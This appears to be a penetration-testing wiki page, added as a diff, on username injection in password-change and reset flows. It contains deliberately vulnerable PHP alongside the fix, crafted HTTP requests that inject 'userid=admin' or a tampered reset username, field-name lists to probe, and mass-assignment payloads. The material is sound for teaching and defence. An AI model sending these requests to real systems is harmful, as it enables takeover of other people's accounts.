@@ -1,0 +1,239 @@
+---
+title: Username injection
+description: Reset and change-password flows that trust user-supplied identity fields - overriding the session's user to take over arbitrary accounts.
+mitre: [T1078, T1212]
+d3fend: [D3-AH]
+impact: [AuthBypass, CredentialTheft]
+owasp: [A07, A01]
+sidebar:
+  order: 8
+  label: Username injection
+---
+import { Aside } from '@astrojs/starlight/components';
+
+## TL;DR
+
+Password-change flows often share a codebase with admin "reset any user's password" flows. When the consumer-facing version reads the target user from a request parameter instead of the session, you can change anyone's password from your own account.
+
+```
+# Normal password change (from your own session)
+POST /change-password   currentpw=...&newpw=...
+                        ↓
+                        backend reads $_SESSION['userid'] → updates your account
+
+# Attack - inject the target user
+POST /change-password   currentpw=...&newpw=...&userid=admin
+                        ↓
+                        backend reads $_REQUEST['userid'] (precedence over session) → updates admin
+```
+
+Success indicator: target account's password is changed to your chosen value; you log in as that user.
+
+## The vulnerability shape
+
+The vulnerable pattern is reuse: the application's developers wrote one "change password" function and used it for both:
+
+- **User-initiated changes** - current user changes their own password (target = self)
+- **Admin-initiated changes** - admin/helpdesk changes another user's password (target = explicit)
+
+If both paths share the same endpoint, the endpoint needs a "target user" parameter. The bug is when that parameter is honored for non-admin callers without an authorization check.
+
+### Vulnerable code
+
+```php
+<?php
+// THIS IS BROKEN
+if (isset($_REQUEST['userid'])) {
+    $userid = $_REQUEST['userid'];      // ← attacker controls this
+} else if (isset($_SESSION['userid'])) {
+    $userid = $_SESSION['userid'];
+} else {
+    die("unknown userid");
+}
+
+// Change the password for $userid
+update_password($userid, $_POST['new_password']);
+```
+
+`$_REQUEST` is the union of `$_GET` and `$_POST`, so the attacker can supply `userid` via either method. The endpoint should have:
+
+```php
+// Correct: always read from session for non-admin paths
+$userid = $_SESSION['userid'];
+
+// And check authorization before honoring an explicit userid
+if (isset($_POST['userid']) && $_POST['userid'] !== $_SESSION['userid']) {
+    if (!is_admin($_SESSION['userid'])) {
+        deny();
+    }
+    $userid = $_POST['userid'];
+}
+```
+
+The bug shows up most commonly in PHP (`$_REQUEST` precedence) but isn't language-specific. Equivalent patterns exist in:
+
+- Java: request parameters overriding session attributes
+- Node.js: `req.body.userid` used directly when `req.session.userid` should be canonical
+- ASP.NET: `Request["userid"]` (which checks query string, form, and cookies)
+
+## Identifying the field name
+
+You need the name the application uses for the user identifier. Sources to check:
+
+```html
+<!-- Hidden field in the password-change form -->
+<input type="hidden" name="userid" value="...">
+
+<!-- Field used elsewhere in the app for identifying users -->
+<form action="/messages/send">
+    <input name="recipient" ...>
+</form>
+
+<!-- API endpoint references -->
+fetch('/api/user/' + userid + '/password')
+
+<!-- Profile URLs -->
+/profile?id=12345
+/user/admin/settings
+```
+
+Common field names to try (in order of likelihood):
+
+```
+userid
+user_id
+user
+username
+uid
+account
+account_id
+email
+login
+target_user
+```
+
+If the application uses `userid` for some operations and `user` for others, try both - vulnerable codebases often have inconsistent naming, and the password-change endpoint might honor either.
+
+## Exploitation
+
+### Step 1 - Register your own account
+
+You need an authenticated session to attack from. Create an account through normal registration (or use an account you compromised earlier in the engagement).
+
+### Step 2 - Capture the normal password-change request
+
+Log in as your account, go to the password-change page, submit a real change. Capture the request in Burp:
+
+```http
+POST /change-password HTTP/1.1
+Host: target.example.com
+Cookie: SESSIONID=abc123
+Content-Type: application/x-www-form-urlencoded
+
+current_password=YourCurrentPw&new_password=YourNewPw&confirm_password=YourNewPw
+```
+
+Note that the request body doesn't include any user identifier - the application is reading the user from the session cookie.
+
+### Step 3 - Inject the target user
+
+Replay the same request with an added `userid` field:
+
+```http
+POST /change-password HTTP/1.1
+Host: target.example.com
+Cookie: SESSIONID=abc123                     ← your session
+Content-Type: application/x-www-form-urlencoded
+
+current_password=YourCurrentPw&new_password=AttackerControlled&confirm_password=AttackerControlled&userid=admin
+```
+
+What's happening: the application reads `userid=admin` from the request body, but reads the session cookie too (for "is the current user logged in?"). If the application validates "logged in" against the session but resolves "whose password to change" from `$_REQUEST['userid']`, the admin account's password is updated.
+
+The "current password" field is also worth testing - sometimes the validation against current password is performed against the *injected* user (in which case you need to know admin's current password, which defeats the attack) or against the *session* user (in which case your own current password is enough, and the bug works).
+
+### Step 4 - Log in as the target
+
+After a successful password change, log out and log in as the target user with the password you just set.
+
+## Variants and adjacent bugs
+
+### Username instead of userid
+
+Some applications use the username string rather than a numeric ID:
+
+```http
+POST /change-password ... &username=admin
+```
+
+Try every plausible field name. Submit `userid=admin` and `username=admin` separately, and also together - sometimes one wins and the other is ignored.
+
+### Email as the user identifier
+
+```http
+POST /change-password ... &email=victim@example.com
+```
+
+Email-based identifiers are common in apps that allow email-as-username. The same injection logic applies.
+
+### Multi-step reset flow
+
+A two-step reset flow:
+
+1. Submit username, receive a token (token is bound to that username server-side)
+2. Submit token + new password to complete the reset
+
+Some implementations don't bind the token to the username server-side - they just pass the username through hidden form fields. Tamper the hidden username field at step 2:
+
+```http
+# Step 1: trigger reset for your-own-account, get a valid token via email
+POST /reset-request   username=yourself
+
+# Step 2: submit the token but with a different username
+POST /reset-complete   username=admin&token=YOUR_VALID_TOKEN&new_password=...
+```
+
+If the application accepts your valid (yourself-bound) token for the admin account, the bug is identical in spirit to the password-change injection - user-supplied identity overriding what should be a server-side binding.
+
+### Account-merge or migration features
+
+"Merge two accounts," "migrate username," "transfer ownership" - these features inherently allow changing the target user. The bug here is when the authorization check is missing or weak ("any logged-in user can transfer any account").
+
+### Self-service username change
+
+If your application allows you to change your own username, see whether the change is checked against existing usernames. If not, you might be able to:
+
+1. Note your current userid (e.g., 1042)
+2. Change your username to `admin` (collision allowed)
+3. Trigger anything that resolves user by username - now there are two accounts named `admin`, and the application's choice between them is unspecified
+
+## Detection
+
+The basic check: examine the password-change request body. Does it include a user identifier?
+
+```bash
+# Capture the normal request and look at the form fields
+curl -s -X POST -d "current=x&new=y&confirm=y" -b "SESSIONID=abc" -v https://<TARGET>/change-password 2>&1 | grep -E "^>" 
+```
+
+Body contains the user ID → application probably reads it from the body, and probably trusts it (bug present).
+Body doesn't contain user ID → application reads from session, probably safe at this endpoint (but reset and merge flows may still be vulnerable).
+
+### Active test
+
+Add a `userid=different-user` field and submit. Observe whether the response changes:
+
+- "Password changed successfully" + you can now log in as `different-user` → vulnerable
+- "Permission denied" / "Cannot change another user's password" → authorization is enforced
+- "Password changed successfully" but `different-user`'s password didn't actually change → field is ignored (safe at this endpoint)
+
+## Notes
+
+- **The bug often coexists with weak reset tokens.** Once an application is sloppy about identity in one auth flow, it's usually sloppy in others. After finding a username injection in password change, check the reset flow ([Reset tokens](/codex/web/auth/reset-tokens/)) too.
+- **Audit-log behavior reveals scope.** When the bug fires, who does the audit log credit for the password change? If it credits the attacker's session user, the bug also leaves a forensic trail naming you. If it credits the target user, the bug is harder to detect from the logs side.
+- **Adjacent endpoints with the same primitive.** Anything that takes "an action on a user" - disable account, change email, change role, delete profile - may share the same broken identity-resolution logic. After confirming one, check others.
+- **Mass-assignment relatives.** A related bug class allows setting *arbitrary fields* on the user record (not just password) via injection: `userid=admin&role=admin&is_admin=true`. If the application's user-update endpoint doesn't allowlist which fields are settable, the attacker upgrades themselves rather than taking over admin. Worth probing once you've confirmed the basic injection.
+
+<Aside type="caution">
+Changing another user's password is a destructive action - the legitimate user can't log in until they reset. Coordinate with the engagement scope before exploiting at scale. The "stealth" demonstration is: change a test account's password (an account you both control), document the request and response, and stop there for the report. Don't take over real users' accounts unless explicitly authorized.
+</Aside>
